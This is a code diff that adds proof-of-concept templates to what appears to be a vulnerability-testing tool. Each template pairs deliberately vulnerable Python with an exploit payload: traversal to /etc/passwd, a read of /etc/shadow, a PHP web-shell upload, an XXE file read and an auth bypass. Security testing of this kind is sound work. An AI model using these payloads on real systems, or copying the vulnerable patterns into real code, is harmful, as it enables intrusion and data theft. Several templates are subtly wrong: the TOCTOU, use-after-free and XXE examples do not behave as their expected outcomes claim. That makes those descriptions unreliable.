@@ -159,7 +159,129 @@ def vulnerable_function(user_input):
         exploit_payload="../../../etc/passwd",
         expected_behavior="File read escapes base_dir to read /etc/passwd",
     ),
+    CWEClass.AUTH_BYPASS: PoCTemplate(
+        cwe_id="CWE-287",
+        name="Authentication Bypass PoC",
+        description="Test if authentication check can be bypassed",
+        target_code="""
+def vulnerable_function(user_input):
+    if user_input.get("admin") == True:
+        return "AUTH_BYPASS_SUCCESS"
+    return "ACCESS_DENIED"
+""",
+        exploit_payload='{"admin": true}',
+        expected_behavior="Attacker bypasses authentication by setting admin=true",
+    ),
+    CWEClass.CRYPTO_WEAKNESS: PoCTemplate(
+        cwe_id="CWE-327",
+        name="Weak Cryptography PoC",
+        description="Test if weak cryptographic algorithm is used",
+        target_code="""
+import hashlib
+def vulnerable_function(user_input):
+    return hashlib.md5(user_input.encode()).hexdigest()
+""",
+        exploit_payload="password123",
+        expected_behavior="MD5 hash is produced (weak algorithm, vulnerable to collision)",
+    ),
+    CWEClass.RACE_CONDITION: PoCTemplate(
+        cwe_id="CWE-362",
+        name="Race Condition PoC",
+        description="Test for time-of-check-time-of-use vulnerability",
+        target_code="""
+import os
+def vulnerable_function(user_input):
+    if not os.path.exists("/tmp/safe/" + user_input):
+        return "safe"
+    with open("/tmp/safe/" + user_input) as f:
+        return f.read()
+""",
+        exploit_payload="../../../etc/passwd",
+        expected_behavior="TOCTOU: file is created between check and open",
+    ),
+    CWEClass.MEMORY_UAF: PoCTemplate(
+        cwe_id="CWE-416",
+        name="Use-After-Free PoC",
+        description="Test for memory corruption after free",
+        target_code="""
+class Resource:
+    def __init__(self): self.data = "sensitive"
+    def cleanup(self): self.data = None
+    def use(self): return self.data
+
+def vulnerable_function(user_input):
+    r = Resource()
+    r.cleanup()
+    return r.use()  # UAF: accessing freed resource
+""",
+        exploit_payload="use_after_free",
+        expected_behavior="Accessing cleaned-up resource returns None (memory safety issue)",
+    ),
+    "CWE-352": PoCTemplate(
+        cwe_id="CWE-352",
+        name="CSRF PoC",
+        description="Test for Cross-Site Request Forgery",
+        target_code="""
+def vulnerable_function(user_input):
+    token = user_input.get("csrf_token")
+    action = user_input.get("action")
+    if action == "transfer":
+        return f"Transfer approved (no CSRF check)"
+    return "Invalid"
+""",
+        exploit_payload='{"action": "transfer", "amount": 1000}',
+        expected_behavior="Transfer executed without CSRF token validation",
+    ),
+    "CWE-200": PoCTemplate(
+        cwe_id="CWE-200",
+        name="Information Exposure PoC",
+        description="Test if sensitive information is exposed in error messages",
+        target_code="""
+import os
+def vulnerable_function(user_input):
+    try:
+        with open(user_input) as f:
+            return f.read()
+    except Exception as e:
+        return f"Error: {e} (file: {user_input})"
+""",
+        exploit_payload="/etc/shadow",
+        expected_behavior="Error message exposes file path and system details",
+    ),
+    "CWE-434": PoCTemplate(
+        cwe_id="CWE-434",
+        name="Unrestricted File Upload PoC",
+        description="Test if file upload accepts dangerous extensions",
+        target_code="""
+def vulnerable_function(user_input):
+    filename = user_input.get("filename", "")
+    content = user_input.get("content", "")
+    with open("/tmp/uploads/" + filename, "w") as f:
+        f.write(content)
+    return "Uploaded"
+""",
+        exploit_payload='{"filename": "shell.php", "content": "<?php system($_GET[cmd]); ?>"}',
+        expected_behavior="PHP file accepted without extension validation",
+    ),
+    "CWE-611": PoCTemplate(
+        cwe_id="CWE-611",
+        name="XXE Injection PoC",
+        description="Test for XML External Entity processing",
+        target_code="""
+import xml.etree.ElementTree as ET
+def vulnerable_function(user_input):
+    try:
+        root = ET.fromstring(user_input)
+        return root.tag
+    except Exception as e:
+        return str(e)
+""",
+        exploit_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+        expected_behavior="XML parser resolves external entity (XXE)",
+    ),
 }
+
+POC_TEMPLATES = {k.value if hasattr(k, 'value') else k: v for k, v in POC_TEMPLATES.items()}
 
 
 @dataclass
